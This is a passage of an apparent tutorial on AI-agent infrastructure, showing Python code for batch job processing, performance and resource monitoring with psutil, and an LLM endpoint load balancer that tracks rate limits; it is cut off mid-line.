            for item_id, result in results:
                if isinstance(result, Exception):
                    self.running_jobs[job_id]["errors"][item_id] = str(result)
                else:
                    self.running_jobs[job_id]["results"][item_id] = result
                
                self.running_jobs[job_id]["completed_items"] += 1
        
        # Mark job as completed
        self.running_jobs[job_id]["status"] = "completed"
        self.running_jobs[job_id]["end_time"] = time.time()
        self.running_jobs[job_id]["duration"] = self.running_jobs[job_id]["end_time"] - self.running_jobs[job_id]["start_time"]
    
    async def _process_item(self, 
                           item_id: str,
                           message: str,
                           context: Optional[str],
                           agent_type: str) -> Tuple[str, Any]:
        """
        Process a single item.
        
        Args:
            item_id: Item ID
            message: Message to process
            context: Optional context
            agent_type: Type of agent to use
            
        Returns:
            Tuple of (item_id, result)
        """
        try:
            # Get an agent from the pool
            agent_ref = await self.agent_manager.get_agent.remote(agent_type)
            
            # Process the request
            response = await agent_ref.generate_response.remote(message, context)
            
            # Release the agent back to the pool
            await self.agent_manager.release_agent.remote(agent_ref, agent_type)
            
            return item_id, response
            
        except Exception as e:
            logger.error(f"Error processing item {item_id}: {e}")
            return item_id, e
    
    async def get_job_status(self, job_id: str) -> Dict[str, Any]:
        """
        Get the status of a batch job.
        
        Args:
            job_id: Job ID
            
        Returns:
            Job status
        """
        if job_id not in self.running_jobs:
            return {"error": f"Job {job_id} not found"}
        
        job_data = self.running_jobs[job_id].copy()
        
        # Calculate progress
        total_items = job_data["total_items"]
        completed_items = job_data["completed_items"]
        progress = (completed_items / total_items) * 100 if total_items > 0 else 0
        
        job_data["progress"] = progress
        
        # Limit the size of the response
        if len(job_data["results"]) > 10:
            result_sample = {k: job_data["results"][k] for k in list(job_data["results"])[:10]}
            job_data["results"] = result_sample
            job_data["results_truncated"] = True
        
        if len(job_data["errors"]) > 10:
            error_sample = {k: job_data["errors"][k] for k in list(job_data["errors"])[:10]}
            job_data["errors"] = error_sample
            job_data["errors_truncated"] = True
        
        return job_data
    
    async def list_jobs(self) -> List[Dict[str, Any]]:
        """
        List all batch jobs.
        
        Returns:
            List of job summaries
        """
        job_summaries = []
        
        for job_id, job_data in self.running_jobs.items():
            total_items = job_data["total_items"]
            completed_items = job_data["completed_items"]
            progress = (completed_items / total_items) * 100 if total_items > 0 else 0
            
            summary = {
                "job_id": job_id,
                "status": job_data["status"],
                "progress": progress,
                "total_items": total_items,
                "completed_items": completed_items,
                "start_time": job_data.get("start_time"),
                "end_time": job_data.get("end_time"),
                "duration": job_data.get("duration"),
                "error_count": len(job_data["errors"])
            }
            
            job_summaries.append(summary)
        
        return job_summaries
```

**2. Performance Monitoring and Resource Management**

```python
# monitoring/performance_tracker.py
import os
import time
import json
import threading
import logging
import psutil
import numpy as np
from typing import Dict, List, Any, Optional, Union, Tuple
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)

@dataclass
class PerformanceMetrics:
    """Performance metrics for AI agent operations."""
    operation_id: str
    operation_type: str
    start_time: float
    end_time: Optional[float] = None
    duration: Optional[float] = None
    success: bool = True
    error: Optional[str] = None
    token_count: Optional[int] = None
    token_cost: Optional[float] = None
    cpu_percent: Optional[float] = None
    memory_mb: Optional[float] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

class PerformanceTracker:
    """
    Tracks performance metrics for AI agent operations.
    """
    
    def __init__(self, metrics_path: Optional[str] = None):
        """
        Initialize the performance tracker.
        
        Args:
            metrics_path: Optional path for storing metrics
        """
        self.metrics_path = metrics_path
        self.metrics = []
        self.lock = threading.RLock()
        
        # Initialize process monitoring
        self.process = psutil.Process(os.getpid())
        
        # Start metrics saving thread if path provided
        if metrics_path:
            self._start_metrics_saving()
    
    def start_operation(self, 
                       operation_type: str,
                       metadata: Optional[Dict[str, Any]] = None) -> str:
        """
        Start tracking an operation.
        
        Args:
            operation_type: Type of operation
            metadata: Optional metadata
            
        Returns:
            Operation ID
        """
        operation_id = f"op_{time.time()}_{len(self.metrics)}"
        
        # Create metrics object
        metrics = PerformanceMetrics(
            operation_id=operation_id,
            operation_type=operation_type,
            start_time=time.time(),
            metadata=metadata or {}
        )
        
        # Snapshot resource usage at start
        try:
            metrics.cpu_percent = self.process.cpu_percent(interval=0.1)
            metrics.memory_mb = self.process.memory_info().rss / (1024 * 1024)
        except:
            pass
        
        # Store metrics
        with self.lock:
            self.metrics.append(metrics)
        
        return operation_id
    
    def end_operation(self, 
                     operation_id: str,
                     success: bool = True,
                     error: Optional[str] = None,
                     token_count: Optional[int] = None,
                     token_cost: Optional[float] = None,
                     additional_metadata: Optional[Dict[str, Any]] = None) -> Optional[PerformanceMetrics]:
        """
        End tracking an operation.
        
        Args:
            operation_id: Operation ID
            success: Whether the operation was successful
            error: Optional error message
            token_count: Optional token count
            token_cost: Optional token cost
            additional_metadata: Optional additional metadata
            
        Returns:
            Updated metrics or None if operation not found
        """
        with self.lock:
            # Find the operation
            for metrics in self.metrics:
                if metrics.operation_id == operation_id:
                    # Update metrics
                    metrics.end_time = time.time()
                    metrics.duration = metrics.end_time - metrics.start_time
                    metrics.success = success
                    metrics.error = error
                    metrics.token_count = token_count
                    metrics.token_cost = token_cost
                    
                    # Update metadata
                    if additional_metadata:
                        metrics.metadata.update(additional_metadata)
                    
                    # Snapshot resource usage at end
                    try:
                        metrics.cpu_percent = self.process.cpu_percent(interval=0.1)
                        metrics.memory_mb = self.process.memory_info().rss / (1024 * 1024)
                    except:
                        pass
                    
                    return metrics
        
        logger.warning(f"Operation {operation_id} not found")
        return None
    
    def get_operation_metrics(self, operation_id: str) -> Optional[PerformanceMetrics]:
        """
        Get metrics for a specific operation.
        
        Args:
            operation_id: Operation ID
            
        Returns:
            Operation metrics or None if not found
        """
        with self.lock:
            for metrics in self.metrics:
                if metrics.operation_id == operation_id:
                    return metrics
        
        return None
    
    def get_metrics_summary(self) -> Dict[str, Any]:
        """
        Get a summary of all metrics.
        
        Returns:
            Dictionary with metrics summary
        """
        with self.lock:
            # Count operations by type
            operation_counts = {}
            for metrics in self.metrics:
                operation_type = metrics.operation_type
                operation_counts[operation_type] = operation_counts.get(operation_type, 0) + 1
            
            # Calculate success rates
            success_rates = {}
            for operation_type in operation_counts.keys():
                type_metrics = [m for m in self.metrics if m.operation_type == operation_type]
                success_count = sum(1 for m in type_metrics if m.success)
                success_rates[operation_type] = success_count / len(type_metrics) if type_metrics else 0
            
            # Calculate average durations
            avg_durations = {}
            for operation_type in operation_counts.keys():
                type_metrics = [m for m in self.metrics if m.operation_type == operation_type and m.duration is not None]
                if type_metrics:
                    avg_durations[operation_type] = sum(m.duration for m in type_metrics) / len(type_metrics)
                else:
                    avg_durations[operation_type] = None
            
            # Calculate token usage and costs
            token_usage = {}
            token_costs = {}
            for operation_type in operation_counts.keys():
                type_metrics = [m for m in self.metrics if m.operation_type == operation_type and m.token_count is not None]
                if type_metrics:
                    token_usage[operation_type] = sum(m.token_count for m in type_metrics)
                    token_costs[operation_type] = sum(m.token_cost for m in type_metrics if m.token_cost is not None)
                else:
                    token_usage[operation_type] = None
                    token_costs[operation_type] = None
            
            # Create summary
            return {
                "total_operations": len(self.metrics),
                "operation_counts": operation_counts,
                "success_rates": success_rates,
                "avg_durations": avg_durations,
                "token_usage": token_usage,
                "token_costs": token_costs
            }
    
    def get_performance_report(self) -> Dict[str, Any]:
        """
        Generate a detailed performance report.
        
        Returns:
            Dictionary with performance report
        """
        with self.lock:
            # Copy metrics to avoid modification during analysis
            metrics_copy = self.metrics.copy()
        
        # Only analyze completed operations
        completed = [m for m in metrics_copy if m.duration is not None]
        if not completed:
            return {"error": "No completed operations to analyze"}
        
        # Group by operation type
        by_type = {}
        for metrics in completed:
            operation_type = metrics.operation_type
            if operation_type not in by_type:
                by_type[operation_type] = []
            by_type[operation_type].append(metrics)
        
        # Analyze each operation type
        type_reports = {}
        for operation_type, type_metrics in by_type.items():
            # Extract durations
            durations = [m.duration for m in type_metrics]
            
            # Calculate statistics
            type_report = {
                "count": len(type_metrics),
                "success_count": sum(1 for m in type_metrics if m.success),
                "error_count": sum(1 for m in type_metrics if not m.success),
                "success_rate": sum(1 for m in type_metrics if m.success) / len(type_metrics),
                "duration": {
                    "min": min(durations),
                    "max": max(durations),
                    "mean": np.mean(durations),
                    "median": np.median(durations),
                    "p95": np.percentile(durations, 95),
                    "p99": np.percentile(durations, 99)
                }
            }
            
            # Calculate token usage if available
            token_counts = [m.token_count for m in type_metrics if m.token_count is not None]
            if token_counts:
                type_report["token_usage"] = {
                    "min": min(token_counts),
                    "max": max(token_counts),
                    "mean": np.mean(token_counts),
                    "median": np.median(token_counts),
                    "total": sum(token_counts)
                }
            
            # Calculate costs if available
            costs = [m.token_cost for m in type_metrics if m.token_cost is not None]
            if costs:
                type_report["cost"] = {
                    "min": min(costs),
                    "max": max(costs),
                    "mean": np.mean(costs),
                    "total": sum(costs)
                }
            
            # Add to type reports
            type_reports[operation_type] = type_report
        
        # Create overall report
        all_durations = [m.duration for m in completed]
        overall = {
            "total_operations": len(completed),
            "success_rate": sum(1 for m in completed if m.success) / len(completed),
            "duration": {
                "min": min(all_durations),
                "max": max(all_durations),
                "mean": np.mean(all_durations),
                "median": np.median(all_durations),
                "p95": np.percentile(all_durations, 95)
            }
        }
        
        # Calculate overall token usage and cost
        all_tokens = [m.token_count for m in completed if m.token_count is not None]
        all_costs = [m.token_cost for m in completed if m.token_cost is not None]
        
        if all_tokens:
            overall["total_tokens"] = sum(all_tokens)
            overall["avg_tokens_per_operation"] = sum(all_tokens) / len(all_tokens)
        
        if all_costs:
            overall["total_cost"] = sum(all_costs)
            overall["avg_cost_per_operation"] = sum(all_costs) / len(all_costs)
        
        # Return the complete report
        return {
            "overall": overall,
            "by_operation_type": type_reports,
            "generated_at": time.time()
        }
    
    def clear_metrics(self, older_than_seconds: Optional[float] = None):
        """
        Clear metrics from memory.
        
        Args:
            older_than_seconds: Optional time threshold to only clear older metrics
        """
        with self.lock:
            if older_than_seconds is not None:
                threshold = time.time() - older_than_seconds
                self.metrics = [m for m in self.metrics if m.start_time >= threshold]
            else:
                self.metrics = []
    
    def _start_metrics_saving(self):
        """Start a background thread to periodically save metrics."""
        def save_metrics_task():
            while True:
                try:
                    with self.lock:
                        # Only save completed operations
                        completed = [m for m in self.metrics if m.duration is not None]
                        
                        # Convert to dictionary for serialization
                        metrics_dicts = []
                        for metrics in completed:
                            metrics_dict = {
                                "operation_id": metrics.operation_id,
                                "operation_type": metrics.operation_type,
                                "start_time": metrics.start_time,
                                "end_time": metrics.end_time,
                                "duration": metrics.duration,
                                "success": metrics.success,
                                "error": metrics.error,
                                "token_count": metrics.token_count,
                                "token_cost": metrics.token_cost,
                                "cpu_percent": metrics.cpu_percent,
                                "memory_mb": metrics.memory_mb,
                                "metadata": metrics.metadata
                            }
                            metrics_dicts.append(metrics_dict)
                        
                        # Save to file
                        with open(self.metrics_path, 'w') as f:
                            json.dump(metrics_dicts, f, indent=2)
                        
                        logger.debug(f"Saved {len(metrics_dicts)} metrics to {self.metrics_path}")
                        
                except Exception as e:
                    logger.error(f"Error saving metrics: {e}")
                
                # Sleep for 5 minutes
                time.sleep(300)
        
        # Start thread
        save_thread = threading.Thread(target=save_metrics_task, daemon=True)
        save_thread.start()

class ResourceMonitor:
    """
    Monitors system resources and provides recommendations for scaling.
    """
    
    def __init__(self, 
                 high_cpu_threshold: float = 80.0,
                 high_memory_threshold: float = 80.0,
                 sampling_interval: float = 5.0):
        """
        Initialize the resource monitor.
        
        Args:
            high_cpu_threshold: CPU usage percentage threshold for scaling recommendations
            high_memory_threshold: Memory usage percentage threshold for scaling recommendations
            sampling_interval: Sampling interval in seconds
        """
        self.high_cpu_threshold = high_cpu_threshold
        self.high_memory_threshold = high_memory_threshold
        self.sampling_interval = sampling_interval
        
        self.is_monitoring = False
        self.monitor_thread = None
        self.samples = []
        self.lock = threading.RLock()
    
    def start_monitoring(self):
        """Start resource monitoring."""
        if self.is_monitoring:
            return
        
        self.is_monitoring = True
        self.monitor_thread = threading.Thread(target=self._monitoring_task, daemon=True)
        self.monitor_thread.start()
        
        logger.info("Resource monitoring started")
    
    def stop_monitoring(self):
        """Stop resource monitoring."""
        self.is_monitoring = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=1.0)
            self.monitor_thread = None
        
        logger.info("Resource monitoring stopped")
    
    def _monitoring_task(self):
        """Background task for monitoring resources."""
        while self.is_monitoring:
            try:
                # Get CPU and memory usage
                cpu_percent = psutil.cpu_percent(interval=1.0)
                memory = psutil.virtual_memory()
                memory_percent = memory.percent
                
                # Get disk usage
                disk = psutil.disk_usage('/')
                disk_percent = disk.percent
                
                # Get network IO
                network = psutil.net_io_counters()
                
                # Store sample
                sample = {
                    "timestamp": time.time(),
                    "cpu_percent": cpu_percent,
                    "memory_percent": memory_percent,
                    "memory_used_gb": memory.used / (1024 * 1024 * 1024),
                    "memory_total_gb": memory.total / (1024 * 1024 * 1024),
                    "disk_percent": disk_percent,
                    "disk_used_gb": disk.used / (1024 * 1024 * 1024),
                    "disk_total_gb": disk.total / (1024 * 1024 * 1024),
                    "network_bytes_sent": network.bytes_sent,
                    "network_bytes_recv": network.bytes_recv
                }
                
                with self.lock:
                    self.samples.append(sample)
                    
                    # Keep only the last 1000 samples
                    if len(self.samples) > 1000:
                        self.samples = self.samples[-1000:]
                
                # Sleep until next sample
                time.sleep(self.sampling_interval)
                
            except Exception as e:
                logger.error(f"Error in resource monitoring: {e}")
                time.sleep(self.sampling_interval)
    
    def get_current_usage(self) -> Dict[str, Any]:
        """
        Get current resource usage.
        
        Returns:
            Dictionary with current resource usage
        """
        try:
            # Get CPU and memory usage
            cpu_percent = psutil.cpu_percent(interval=0.5)
            memory = psutil.virtual_memory()
            memory_percent = memory.percent
            
            # Get disk usage
            disk = psutil.disk_usage('/')
            disk_percent = disk.percent
            
            # Get network IO
            network = psutil.net_io_counters()
            
            return {
                "timestamp": time.time(),
                "cpu_percent": cpu_percent,
                "memory_percent": memory_percent,
                "memory_used_gb": memory.used / (1024 * 1024 * 1024),
                "memory_total_gb": memory.total / (1024 * 1024 * 1024),
                "disk_percent": disk_percent,
                "disk_used_gb": disk.used / (1024 * 1024 * 1024),
                "disk_total_gb": disk.total / (1024 * 1024 * 1024),
                "network_bytes_sent": network.bytes_sent,
                "network_bytes_recv": network.bytes_recv
            }
            
        except Exception as e:
            logger.error(f"Error getting current usage: {e}")
            return {"error": str(e)}
    
    def get_usage_history(self, 
                          metric: str = "cpu_percent",
                          limit: int = 60) -> List[Tuple[float, float]]:
        """
        Get historical usage data for a specific metric.
        
        Args:
            metric: Metric to retrieve (e.g., cpu_percent, memory_percent)
            limit: Maximum number of samples to return
            
        Returns:
            List of (timestamp, value) tuples
        """
        with self.lock:
            # Copy samples to avoid modification during processing
            samples = self.samples[-limit:] if limit > 0 else self.samples
        
        # Extract specified metric
        history = [(s["timestamp"], s.get(metric, 0)) for s in samples if metric in s]
        
        return history
    
    def get_scaling_recommendation(self) -> Dict[str, Any]:
        """
        Get scaling recommendations based on resource usage.
        
        Returns:
            Dictionary with scaling recommendations
        """
        with self.lock:
            # Get recent samples
            recent_samples = self.samples[-30:] if len(self.samples) >= 30 else self.samples
        
        if not recent_samples:
            return {"recommendation": "insufficient_data", "reason": "Not enough monitoring data"}
        
        # Calculate average resource usage
        avg_cpu = sum(s["cpu_percent"] for s in recent_samples) / len(recent_samples)
        avg_memory = sum(s["memory_percent"] for s in recent_samples) / len(recent_samples)
        
        # Check for high CPU usage
        if avg_cpu > self.high_cpu_threshold:
            return {
                "recommendation": "scale_up",
                "reason": "high_cpu_usage",
                "details": {
                    "avg_cpu_percent": avg_cpu,
                    "threshold": self.high_cpu_threshold,
                    "suggested_action": "Increase number of worker nodes or CPU allocation"
                }
            }
        
        # Check for high memory usage
        if avg_memory > self.high_memory_threshold:
            return {
                "recommendation": "scale_up",
                "reason": "high_memory_usage",
                "details": {
                    "avg_memory_percent": avg_memory,
                    "threshold": self.high_memory_threshold,
                    "suggested_action": "Increase memory allocation or add more nodes"
                }
            }
        
        # Check for potential downscaling
        if avg_cpu < self.high_cpu_threshold / 2 and avg_memory < self.high_memory_threshold / 2:
            return {
                "recommendation": "scale_down",
                "reason": "low_resource_usage",
                "details": {
                    "avg_cpu_percent": avg_cpu,
                    "avg_memory_percent": avg_memory,
                    "suggested_action": "Consider reducing resource allocation if this pattern persists"
                }
            }
        
        # Default recommendation
        return {
            "recommendation": "maintain",
            "reason": "resource_usage_within_limits",
            "details": {
                "avg_cpu_percent": avg_cpu,
                "avg_memory_percent": avg_memory
            }
        }
```

**3. Dynamic Load Balancing for LLM-Powered Systems**

```python
# load_balancing/llm_load_balancer.py
import os
import time
import json
import random
import logging
import threading
import datetime
from typing import Dict, List, Any, Optional, Callable, TypeVar, Generic, Tuple

T = TypeVar('T')  # Input type
R = TypeVar('R')  # Result type

logger = logging.getLogger(__name__)

class ModelEndpoint:
    """
    Represents an LLM API endpoint with performance characteristics.
    """
    
    def __init__(self, 
                 endpoint_id: str,
                 model_name: str,
                 api_key: str,
                 max_requests_per_minute: int,
                 max_tokens_per_minute: int,
                 latency_ms: float = 1000.0,
                 cost_per_1k_tokens: float = 0.0,
                 context_window: int = 4096,
                 endpoint_url: Optional[str] = None,
                 supports_functions: bool = False,
                 capabilities: List[str] = None):
        """
        Initialize a model endpoint.
        
        Args:
            endpoint_id: Unique identifier for this endpoint
            model_name: Name of the model (e.g., gpt-4-turbo)
            api_key: API key for this endpoint
            max_requests_per_minute: Maximum requests per minute
            max_tokens_per_minute: Maximum tokens per minute
            latency_ms: Average latency in milliseconds
            cost_per_1k_tokens: Cost per 1000 tokens
            context_window: Maximum context window size in tokens
            endpoint_url: Optional custom endpoint URL
            supports_functions: Whether this endpoint supports function calling
            capabilities: List of special capabilities this endpoint supports
        """
        self.endpoint_id = endpoint_id
        self.model_name = model_name
        self.api_key = api_key
        self.max_requests_per_minute = max_requests_per_minute
        self.max_tokens_per_minute = max_tokens_per_minute
        self.latency_ms = latency_ms
        self.cost_per_1k_tokens = cost_per_1k_tokens
        self.context_window = context_window
        self.endpoint_url = endpoint_url
        self.supports_functions = supports_functions
        self.capabilities = capabilities or []
        
        # Metrics tracking
        self.requests_last_minute = 0
        self.tokens_last_minute = 0
        self.last_request_time = 0
        self.success_count = 0
        self.error_count = 0
        self.total_latency_ms = 0
        self.total_tokens = 0
        self.total_cost = 0.0
        
        # Last minute tracking
        self.request_timestamps = []
        self.token_usage_events = []
        
        # Health status
        self.is_healthy = True
        self.last_error = None
        self.consecutive_errors = 0
        
        # Lock for thread safety
        self.lock = threading.RLock()
    
    def update_metrics(self, 
                      success: bool, 
                      latency_ms: float, 
                      tokens_used: int,
                      error: Optional[str] = None):
        """
        Update endpoint metrics after a request.
        
        Args:
            success: Whether the request was successful
            latency_ms: Request latency in milliseconds
            tokens_used: Number of tokens used
            error: Optional error message
        """
        current_time = time.time()
        
        with self.lock:
            # Update overall metrics
            if success:
                self.success_count += 1
                self.total_latency_ms += latency_ms
                self.total_tokens += tokens_used
                self.total_cost += (tokens_used / 1000) * self.cost_per_1k_tokens
                self.last_error = None
                self.consecutive_errors = 0
            else:
                self.error_count += 1
                self.last_error = error
                self.consecutive_errors += 1
                
                # Mark as unhealthy after 3 consecutive errors
                if self.consecutive_errors >= 3:
                    self.is_healthy = False
            
            # Update last minute tracking
            self.last_request_time = current_time
            self.request_timestamps.append(current_time)
            
            if tokens_used > 0:
                self.token_usage_events.append((current_time, tokens_used))
            
            # Remove old timestamps (older than 1 minute)
            one_minute_ago = current_time - 60
            self.request_timestamps = [ts for ts in self.request_timestamps if ts > one_minute_ago]
            self.token_usage_events = [event for event in self.token_usage_events if event[0] > one_minute_ago]
            
            # Update current rates
            self.requests_last_minute = len(self.request_timestamps)
            self.tokens_last_minute = sum(tokens for _, tokens in self.token_usage_events)
    
    def can_handle_request(self, estimated_tokens: int = 1000) -> bool:
        """
        Check if this endpoint can handle a new request.
        
        Args:
            estimated_tokens: Estimated tokens for the request
            
        Returns:
            True if the endpoint can handle the request
        """
        with self.lock:
            # Check health status
            if not self.is_healthy:
                return False
            
            # Check rate limits
            if self.requests_last_minute >= self.max_requests_per_minute:
                return False
            
            if self.tokens_last_minute + estimated_tokens > self.max_tokens_per_minute:
                return False
            
            return True
    
    def get_load_percentage(self) -> Tuple[float, float]:
        """
        Get the current load percentage of this endpoint.
        
        Returns:
            Tuple of (requests_percentage, tokens_percentage)
        """
        with self.lock:
            requests_percentage = (self.requests_last_minute / self.max_requests_per_minute) * 100 if self.max_requests_per_minute > 0 else 0
            tokens_percentage = (self.tokens_last_minute / self.max_tokens_per_minute) * 100 if self.max_tokens_per_minute > 0 else 0
            
            return (requests_percentage, tokens_percentage)
    
    def get_metrics(self) -> Dict[str, Any]:
        """
        Get current endpoint metrics.
        
        Returns:
            Dictionary with endpoint metrics
        """
        with self.lock:
            total_requests = self.success_count + self.error_count
            avg_latency = self.total_latency_ms / self.success_count if self.success